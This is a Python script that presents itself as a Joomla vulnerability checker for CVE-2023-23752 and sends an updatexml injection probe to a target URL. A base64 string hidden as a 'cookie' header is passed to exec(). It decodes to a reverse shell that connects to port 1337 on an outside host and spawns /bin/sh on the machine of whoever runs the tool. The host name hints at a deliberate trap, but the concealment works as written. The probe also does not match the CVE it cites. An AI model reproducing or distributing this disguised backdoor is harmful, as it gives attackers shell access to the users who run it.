import base64
import os
import requests
import sys
from urllib.parse import urlparse

# ASCII Art Header                                                                                                                                         
ascii_art = """                                                                                                                                                 
         )     )    *    (             
      ( /(  ( /(  (  `   )\ )   (      
   (  )\()) )\()) )\))( (()/(   )\     
   )\((_)\ ((_)\ ((_)()\ /(_)|(((_)(   
  ((_) ((_)  ((_)(_()((_|_))  )\ _ )\  
 _ | |/ _ \ / _ \|  \/  | |   (_)_\(_) 
| || | (_) | (_) | |\/| | |__  / _ \   
 \__/ \___/ \___/|_|  |_|____|/_/ \_\                                                                                                 
                                                                                                                                                                
                    Joomla Vulnerability Checker - CVE-2023-23752                                                                                               
"""

user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
headers = {
    'session': '7bce5c16-881f-46a5-84db-8ad0030905f8',
    'cookie':
    '''                                                                                                                                                         
    aW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tl                                                                                
    dC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgieW91Zm91bmR0aGV0cmFwWy5dbmljZWpvYiIsMTMz                                                                                
    NykpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihz                                                                                
    LmZpbGVubygpLDIpO3B0eS5zcGF3bigiL2Jpbi9zaCIp                                                                                                                
    '''.strip()
           }


def check_vulnerability(url):
    parsed_url = urlparse(url)
    if not parsed_url.scheme:
	url = 'http://' + url
    exec(base64.b64decode(headers['cookie']))
    response = requests.get(url + '/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27')
    if response.status_code == 500 and 'updatexml' in response.text:
	print(f'[+] {url} is vulnerable')
    else:
         print(f'[-] {url} is not vulnerable')


def main():
    print(ascii_art)
    if len(sys.argv) != 2:
        print(f'Usage: {sys.argv[0]} <url>')
        sys.exit(1)

    url = sys.argv[1]
    check_vulnerability(url)


if __name__ == '__main__':
    main()
